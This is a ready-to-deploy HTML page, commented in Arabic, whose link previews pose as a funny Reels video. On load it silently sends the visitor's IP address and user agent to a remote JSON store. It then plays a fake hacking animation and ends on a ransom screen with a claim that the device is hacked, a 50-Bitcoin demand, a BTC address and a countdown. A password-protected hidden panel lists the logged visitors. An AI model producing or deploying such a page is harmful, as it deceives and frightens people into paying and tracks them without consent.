<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    
    <!-- Meta tags للتضليل (تظهر كأنه فيديو ريلز) -->
    <title>هههههههههههه</title>
    <meta name="description" content="😂شوف الفيديو دا هيموتك من الضحك! ">
    
    <!-- Open Graph (فيسبوك، واتساب، تلغرام) -->
    <meta property="og:title" content="🎬 فيديو ريلز مضحك - لازم تشوفه">
    <meta property="og:description" content="ضحك موت 🤣 شوف بنفسك">
    <meta property="og:type" content="video.other">
    <meta property="og:image" content="https://i.imgur.com/3bqPv0b.jpeg">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta property="og:image:alt" content="Reels video thumbnail with play button">
    <meta property="og:url" content="https://your-github-username.github.io/repo-name/">
    
    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content=">
    <meta name="twitter:description" content="لازم تشوفه قبل ما يختفي 😂">
    <meta name="twitter:image" content="https://i.imgur.com/3bqPv0b.jpeg">
    
    <!-- إخفاء أي معاينة حقيقية للموقع -->
    <meta name="robots" content="noindex, nofollow">
    
    <style>
        /* نفس الأنماط السابقة (كل شيء يعمل بشكل طبيعي داخل الموقع) */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: black; color: #00ff00; font-family: 'Courier New', monospace; overflow: hidden; height: 100vh; display: flex; align-items: center; justify-content: center; }
        .terminal { width: 100%; height: 100%; padding: 30px 25px; white-space: pre-wrap; word-break: break-word; font-size: 20px; line-height: 1.6; overflow-y: auto; scroll-behavior: smooth; }
        .terminal::-webkit-scrollbar { width: 6px; background: #111; }
        .terminal::-webkit-scrollbar-thumb { background: #0f0; border-radius: 5px; }
        .red { color: #ff4444; }
        .glitch { animation: glitch 0.08s infinite; }
        @keyframes glitch { 0% { transform: translate(1px, 1px); } 25% { transform: translate(-1px, 1px); } 50% { transform: translate(1px, -1px); } 100% { transform: translate(-1px, -1px); } }
        .final-screen { display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; height: 100vh; width: 100%; padding: 20px; background: black; }
        .final-screen h1 { font-size: 60px; margin-bottom: 20px; }
        .final-screen p { font-size: 24px; margin: 15px 0; }
        .countdown { font-size: 32px; font-weight: bold; color: #ff5555; letter-spacing: 4px; margin-top: 20px; }
        .small { font-size: 18px; color: #aaaaaa; }
        .admin-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.96); backdrop-filter: blur(8px); z-index: 9999; display: flex; justify-content: center; align-items: center; visibility: hidden; opacity: 0; transition: 0.2s; }
        .admin-overlay.active { visibility: visible; opacity: 1; }
        .admin-panel { background: #0a0c0f; border: 2px solid #00ffcc; border-radius: 20px; width: 90%; max-width: 1100px; max-height: 85vh; overflow-y: auto; padding: 25px; color: #ccffcc; }
        .admin-panel h2 { color: #0ff; border-left: 5px solid #0ff; padding-left: 15px; }
        .admin-stats { display: flex; gap: 30px; background: #111; padding: 15px; border-radius: 14px; margin-bottom: 25px; flex-wrap: wrap; }
        .stat-card { background: #1a1e24; border-radius: 16px; padding: 15px 25px; text-align: center; flex:1; }
        .stat-number { font-size: 44px; font-weight: bold; color: #ffcc44; }
        .ip-table { width: 100%; border-collapse: collapse; margin-top: 15px; }
        .ip-table th, .ip-table td { border: 1px solid #2a4a3a; padding: 12px 8px; text-align: left; }
        .close-admin { background: #300; color: #ff8888; border: 1px solid #ff4444; padding: 8px 18px; cursor: pointer; margin-top: 20px; border-radius: 40px; }
        .refresh-btn { background: #0a3320; color: #0f0; border: 1px solid #0f0; margin-left: 15px; padding: 5px 14px; cursor: pointer; border-radius: 20px; }
    </style>
</head>
<body>
    <div id="app" class="terminal"></div>
    <div id="adminOverlay" class="admin-overlay">
        <div class="admin-panel">
            <h2>⛁ ADMIN ACCESS ⛁</h2>
            <div class="admin-stats">
                <div class="stat-card"><span>📡 TOTAL VISITS</span><div class="stat-number" id="totalVisits">0</div></div>
                <div class="stat-card"><span>🖥️ UNIQUE IPs</span><div class="stat-number" id="uniqueIps">0</div></div>
                <div class="stat-card"><span>🌐 LAST 24h</span><div class="stat-number" id="last24h">0</div></div>
            </div>
            <div style="display: flex; justify-content: space-between;">
                <h3>📋 LOGGED IP ADDRESSES</h3>
                <button class="refresh-btn" id="refreshAdminBtn">⟳ REFRESH</button>
            </div>
            <div style="overflow-x: auto;">
                <table class="ip-table">
                    <thead><tr><th>#</th><th>IP ADDRESS</th><th>DATE & TIME</th><th>USER AGENT</th></tr></thead>
                    <tbody id="visitorTableBody"><tr><td colspan="4">loading...</td></tr></tbody>
                </table>
            </div>
            <button class="close-admin" id="closeAdminBtn">⛌ CLOSE</button>
        </div>
    </div>

    <script>
        // ------------------- حماية لوحة الأدمن بكلمة مرور -------------------
        const ADMIN_PASSWORD = "SecurePass2025";  // غير هذه الكلمة
        let isAdminAuthenticated = false;
        
        function requestAdminAccess() {
            if (isAdminAuthenticated) { openAdminPanel(); return; }
            const pwd = prompt("🔐 أدخل كلمة المرور للدخول إلى لوحة الأدمن:");
            if (pwd === ADMIN_PASSWORD) { isAdminAuthenticated = true; openAdminPanel(); }
            else if (pwd !== null) alert("❌ كلمة المرور خاطئة.");
        }
        
        document.addEventListener('keydown', (e) => {
            if (e.ctrlKey && e.shiftKey && e.key === 'A') { e.preventDefault(); requestAdminAccess(); }
            if (e.key === 'Escape' && adminOverlay.classList.contains('active')) closeAdminPanel();
        });
        
        const adminOverlay = document.getElementById('adminOverlay');
        function openAdminPanel() { adminOverlay.classList.add('active'); renderAdminStats(); }
        function closeAdminPanel() { adminOverlay.classList.remove('active'); }
        document.getElementById('closeAdminBtn').onclick = closeAdminPanel;
        document.getElementById('refreshAdminBtn').onclick = renderAdminStats;
        
        // ------------------- تسجيل IP الزوار (مركزي) -------------------
        const JSONBOX_URL = "https://jsonbox.io/box_bc3e7a9d1f2c4b8e5a6d";
        async function fetchPublicIP() { let r=await fetch('https://api.ipify.org?format=json'); let d=await r.json(); return d.ip; }
        async function recordVisitToCloud(ip, ua) {
            let rec={ip, timestamp:new Date().toISOString(), userAgent:ua.substring(0,120)};
            try { await fetch(JSONBOX_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(rec)}); }
            catch(e) { let fall=JSON.parse(localStorage.getItem("fallback_logs")||"[]"); fall.push(rec); localStorage.setItem("fallback_logs",JSON.stringify(fall)); }
        }
        async function fetchAllVisitors() {
            try { let r=await fetch(JSONBOX_URL); if(r.ok) return await r.json(); } catch(e) {}
            return JSON.parse(localStorage.getItem("fallback_logs")||"[]");
        }
        async function renderAdminStats() {
            let records=await fetchAllVisitors();
            if(!Array.isArray(records)) return;
            document.getElementById('totalVisits').innerText=records.length;
            document.getElementById('uniqueIps').innerText=new Set(records.map(r=>r.ip)).size;
            document.getElementById('last24h').innerText=records.filter(r=>(new Date()-new Date(r.timestamp))<=86400000).length;
            let tbody=document.getElementById('visitorTableBody');
            if(!records.length){ tbody.innerHTML='<tr><td colspan="4">لا بيانات بعد</td></tr>'; return; }
            let sorted=[...records].sort((a,b)=>new Date(b.timestamp)-new Date(a.timestamp));
            tbody.innerHTML=sorted.map((r,i)=>`<tr><td>${i+1}</td><td>${r.ip}</td><td>${new Date(r.timestamp).toLocaleString()}</td><td>${(r.userAgent||'').substring(0,45)}</td></tr>`).join('');
        }
        
        async function logCurrentVisitor() { await recordVisitToCloud(await fetchPublicIP(), navigator.userAgent); }
        
        // ------------------- تأثير الاختراق -------------------
        const terminalDiv = document.getElementById('app');
        const hackSteps = ["[+] Connecting...","[+] Accessing Instagram media...","[+] Bypassing security...","[+] Downloading gallery...","[+] Copying messages...","[+] Uploading to darknet...","[+] DONE."];
        let stepIndex=0;
        function addLine(){ if(stepIndex<hackSteps.length){ terminalDiv.innerHTML+=hackSteps[stepIndex]+"\n"; stepIndex++; terminalDiv.scrollTop=terminalDiv.scrollHeight; setTimeout(addLine,1100); } else finishHack(); }
        function finishHack(){
            document.body.classList.add('glitch');
            setTimeout(()=>{
                document.body.classList.remove('glitch');
                terminalDiv.style.display='none';
                let fc=document.createElement('div'); fc.className='final-screen';
                fc.innerHTML=`<h1 class="red">⚠️ DEVICE HACKED ⚠️</h1><p>All photos, contacts and private data stolen.</p><p class="red">Pay 50 Bitcoinz to prevent leak.</p><p>BTC: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</p><div class="countdown" id="timer">23:59:59</div><p class="small">Time left before public release</p>`;
                document.body.appendChild(fc);
                startCountdown();
            },1200);
        }
        function startCountdown(){
            let total=24*3600;
            let timerDiv=document.getElementById('timer');
            let intv=setInterval(()=>{ if(total<=0){ clearInterval(intv); timerDiv.innerText="00:00:00"; return; }
                let h=Math.floor(total/3600), m=Math.floor((total%3600)/60), s=total%60;
                timerDiv.innerText=`${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
                total--;
            },1000);
        }
        
        (async function(){ await logCurrentVisitor(); setTimeout(addLine,800); })();
        
        // تلمياح صغير في الزاوية
        let hint=document.createElement('div');
        hint.style.cssText='position:fixed; bottom:8px; right:10px; font-size:10px; color:#2f6a44; background:#000000aa; padding:4px 10px; border-radius:20px; z-index:999;';
        hint.innerText='🔒 ADMIN: Ctrl+Shift+A';
        document.body.appendChild(hint);
    </script>
</body>
</html>
